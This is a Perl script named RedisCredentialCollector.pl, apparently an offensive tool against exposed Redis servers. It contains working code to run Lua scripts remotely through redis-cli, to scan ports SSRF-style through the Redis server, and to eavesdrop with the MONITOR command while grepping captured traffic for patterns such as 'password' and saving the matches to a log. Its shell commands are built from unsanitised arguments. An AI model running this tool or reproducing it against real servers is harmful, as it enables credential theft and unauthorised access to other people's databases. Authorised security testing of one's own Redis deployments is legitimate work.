#!/usr/bin/perl -wU

use strict;
use 5.010;
use IO::File;
use Getopt::Long;
use Term::ANSIColor;
use System::Timeout qw(system);

=info

useful documentation about Redis security https://redis.io/topics/security



LUA file exemple for  (sandboxed, safe) RCE for testing purposes:

	# cat test.lua:
		"local foo = redis.call('ping')
		return (foo)"

	# ./RedisCredentialCollector.pl --server 192.168.0.2 --execute /tmp/a.lua
	 - Launching ./RedisCredentialCollector.pl - 
	[RCE output] PONG


SSRF style port scanning by abusing Redis:

	#./RedisCredentialCollector.pl --server 192.168.0.2 --scan true --port 6380
		- Launching ./RedisCredentialCollector.pl - 
	[Port 6380] close

	#./RedisCredentialCollector.pl --server 192.168.0.2 --scan true --port 6379
		- Launching ./RedisCredentialCollector.pl - 
	[Port 6379] open

=cut

print colored "\t - Launching $0 - \n", 'yellow';

my $options = GetOptions(
			'server|s=s' => \my $Server,
			'timeout|t=s'  => \my $Timeout, 
			'file|f=s'	=> \my $OutFile,
			'pattern|p=s'	=> \my $Pattern,
			'execute|e=s' => \my $RCE,
			'scan|c=s' => \my $Scan,
			'port|o=s' => \my $Port,
			);
			
Usage() 
	if( !($Server && $Timeout && $OutFile ||  $RCE && $Server || $Scan && $Server && $Port) );


# Argument are ok, we will continue...
my $Payload;


# If .lua script remote code execution (sandboxed by default)
if($RCE){
	$Payload=`redis-cli -h $Server --eval $RCE`;
	say colored("[RCE output] $Payload",'green');
	exit(0);
}

# Port scan using Redis in SSRF style
elsif($Scan){
	$Payload=`redis-cli -u redis://$Server:$Port ping 2>&1`;
	
	if ($Payload !~ /refused/i){
		say colored("[Port $Port] open",'green');
	}
	elsif ($Payload =~ /refused/){
		say colored("[Port $Port] close",'red');
	}
	exit(0);
}

# Credential collection part
else{
	my $TmpFile="/tmp/$0.tmp";
	$Payload="redis-cli -h $Server monitor >> $TmpFile";
	system($Timeout, $Payload);

	my $Cpt=0;
	my @Backup=();

	my $Handle  = IO::File->new($TmpFile, "r") || die $!;




	# Main loop:
	while (my $Lines = $Handle->getline()) {
		chomp($Lines);
		
		if ($Pattern){
			say colored(" Looking for pattern $Pattern",'yellow')
				if($Cpt==0);
			
			if ($Lines =~ /$Pattern/i){
				say colored("[Pattern match] line $Cpt: $Lines",'green');
			}
		}
		elsif(!($Pattern)){
			say colored("[INFO] line $Cpt: $Lines",'blue');
		}
		# Pushing data in a tab for outputfile
		push(@Backup,$Lines);
		$Cpt++;
	} 
	$Handle->close;
	unlink($TmpFile);

	# Writing log file...
	my $Handle2 = IO::File->new($OutFile, "w+") || die $!;

	foreach my $Output(@Backup){
		say $Handle2  $Output;
	}
	say colored("$OutFile log file successfully created!",'blue') || die $!;
	$Handle2->close;
}

# Functions part
sub Usage{
	say colored("\n[*] Usage: $0 --server (-s) <redis_instance> --timeout (-t) <timeout> --file (-f) <log_file> \n\n\tOption:\n\t\t--pattern (-p)<ex: password>\n\t\t--execute (-e) <lua_script_to_execute>\n\n",'red');
	exit(0);
}
